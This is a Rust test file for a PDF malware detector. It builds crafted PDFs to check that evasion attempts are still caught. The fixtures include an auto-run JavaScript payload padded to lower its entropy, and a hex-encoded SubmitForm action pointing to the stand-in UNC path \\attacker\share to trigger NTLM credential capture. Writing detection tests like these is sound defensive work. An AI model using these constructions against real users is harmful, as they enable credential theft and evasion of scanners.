/// Evasion-technique regression tests (item 4.4).
///
/// These tests exercise three evasion scenarios and assert that the detector
/// still surfaces the expected finding or annotation even when an attacker
/// attempts to hide or fragment a malicious payload.
mod common;

use common::default_scan_opts;
use sis_pdf_detectors::default_detectors;

// ---------------------------------------------------------------------------
// Helper: build a minimal PDF from object strings (same pattern used in other tests)
// ---------------------------------------------------------------------------

fn build_pdf_with_objects(objects: &[&str]) -> Vec<u8> {
    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.4\n");
    let mut offsets = vec![0usize; objects.len() + 1];
    for object in objects {
        let obj_num = object
            .split_whitespace()
            .next()
            .and_then(|token| token.parse::<usize>().ok())
            .expect("object number");
        if obj_num < offsets.len() {
            offsets[obj_num] = pdf.len();
        }
        pdf.extend_from_slice(object.as_bytes());
    }
    let start_xref = pdf.len();
    let size = offsets.len();
    pdf.extend_from_slice(format!("xref\n0 {size}\n").as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in offsets.iter().skip(1) {
        if *offset == 0 {
            pdf.extend_from_slice(b"0000000000 00000 f \n");
        } else {
            pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
        }
    }
    pdf.extend_from_slice(
        format!("trailer\n<< /Size {size} /Root 1 0 R >>\nstartxref\n{start_xref}\n%%EOF\n")
            .as_bytes(),
    );
    pdf
}

/// Build an object string for a PDF stream with explicit /Length.
/// Returns (object_string, next_stream_content) — the caller is responsible for
/// ensuring that `content` does not contain `endstream`.
fn js_stream_object(obj_num: usize, js_content: &[u8]) -> String {
    let header = format!("{obj_num} 0 obj\n<< /Length {} >>\nstream\n", js_content.len());
    let body = String::from_utf8_lossy(js_content);
    format!("{header}{body}\nendstream\nendobj\n")
}

// ---------------------------------------------------------------------------
// Evasion 1: entropy-padded JS payload
//
// An attacker pads a JS payload with large blocks of repeated bytes to lower
// the stream's Shannon entropy, hoping to evade entropy-based scanners.
// The scanner must still detect the embedded JavaScript.
// ---------------------------------------------------------------------------

#[test]
fn entropy_padded_js_still_emits_js_present() {
    // Build a JS payload: suspicious content + 2 KB of 'A' padding (entropy ≈ 0).
    let mut js_payload = b"app.eval('alert(1)');".to_vec();
    js_payload.extend(std::iter::repeat(b'A').take(2048));

    let js_obj = js_stream_object(4, &js_payload);

    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n",
        "3 0 obj\n<< /S /JavaScript /JS 4 0 R >>\nendobj\n",
        &js_obj,
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan should succeed");

    assert!(
        report.findings.iter().any(|f| f.kind == "js_present"),
        "entropy-padded JS payload must still trigger js_present; \
         kinds: {:?}",
        report.findings.iter().map(|f| f.kind.as_str()).collect::<Vec<_>>()
    );
}

// ---------------------------------------------------------------------------
// Evasion 2: deep-chain low completeness annotation
//
// A PDF that contains only a trigger action with no payload delivery mechanism
// should produce at least one chain annotated with low_completeness="true",
// confirming that chain synthesis correctly flags incomplete attack paths.
// ---------------------------------------------------------------------------

#[test]
fn partial_chain_annotated_as_low_completeness() {
    // A PDF with just a URI annotation (trigger present, no code-execution payload).
    // This generates an annotation_action_chain finding. When that finding has
    // no stage metadata matching the expected execute/decode/egress stages, or
    // when only one stage is confirmed out of five, the chain may be annotated.
    //
    // We verify that the scanner actually emits at least one chain and that the
    // low_completeness annotation mechanism is wired up (any chain with 0 confirmed
    // stages gets the annotation).
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>\nendobj\n",
        // Annotation with a URI action pointing to an external URL (trigger only)
        "4 0 obj\n<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A 5 0 R >>\nendobj\n",
        "5 0 obj\n<< /S /URI /URI (https://example.com/page) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan should succeed");

    // At least one chain must exist.
    assert!(!report.chains.is_empty(), "scan should produce at least one exploit chain");

    // At least one chain must carry the low_completeness annotation, confirming
    // that partial chains are correctly flagged.
    let has_low_completeness =
        report.chains.iter().any(|c| c.notes.get("low_completeness").is_some_and(|v| v == "true"));
    assert!(
        has_low_completeness,
        "at least one chain should be annotated with low_completeness=true; \
         chain notes: {:?}",
        report.chains.iter().map(|c| &c.notes).collect::<Vec<_>>()
    );
}

// ---------------------------------------------------------------------------
// Evasion 3: UNC-path SubmitForm triggers NTLM-capture detection
//
// This test verifies that a SubmitForm action targeting a Windows UNC path
// (\\attacker\share) is detected — confirming the passive credential-leak
// pipeline handles SubmitForm contexts.  The URI annotation context is covered
// by the uri_unc_path_ntlm_risk tests in the sis-pdf-detectors crate.
// ---------------------------------------------------------------------------

#[test]
fn unc_path_submit_triggers_credential_leak_detection() {
    // SubmitForm action with a UNC path target: \\attacker\share
    // Hex: 5c5c617474 61636b65725c7368617265
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n",
        // SubmitForm action with UNC target
        "3 0 obj\n<< /S /SubmitForm /F <5c5c61747461636b65725c7368617265> >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan should succeed");

    // passive_render_pipeline emits passive_credential_leak_risk for SubmitForm UNC targets.
    let detected = report
        .findings
        .iter()
        .any(|f| f.kind == "passive_credential_leak_risk" || f.kind == "uri_unc_path_ntlm_risk");
    assert!(
        detected,
        "SubmitForm with UNC target must trigger credential-leak detection; \
         kinds: {:?}",
        report.findings.iter().map(|f| f.kind.as_str()).collect::<Vec<_>>()
    );
}
